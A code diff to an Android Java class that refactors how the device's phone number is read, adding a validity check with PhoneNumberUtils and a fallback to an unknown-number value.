@@ -10,6 +10,7 @@ import android.content.Context;
 import android.os.Build;
 import android.provider.Settings.Secure;
 import android.telephony.CellLocation;
+import android.telephony.PhoneNumberUtils;
 import android.telephony.TelephonyManager;
 import android.telephony.cdma.CdmaCellLocation;
 import android.telephony.gsm.GsmCellLocation;
@@ -54,23 +55,29 @@ public class Device {
 	 * @return the phone number
 	 */
 	public String getPhoneNumber() {
-		String number = null;
 		try {
 			TelephonyManager mTelephonyMgr;
 			mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
 
-			number = mTelephonyMgr.getLine1Number();
+			String number = mTelephonyMgr.getLine1Number();
+			if (isPhoneNumber(number) ) {
+				return number;
+			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getPhoneNumber) Error: " + ex);
 			}
 		}
 
-		if (number == null || number.length() == 0) {
-			number = UNKNOWN_NUMBER;
+		return UNKNOWN_NUMBER;
+	}
+
+	private boolean isPhoneNumber(String number) {
+		if(number == null || number.length() == 0) {
+			return false;
 		}
 
-		return number;
+		return PhoneNumberUtils.isGlobalPhoneNumber(number);
 	}
 
 	/**
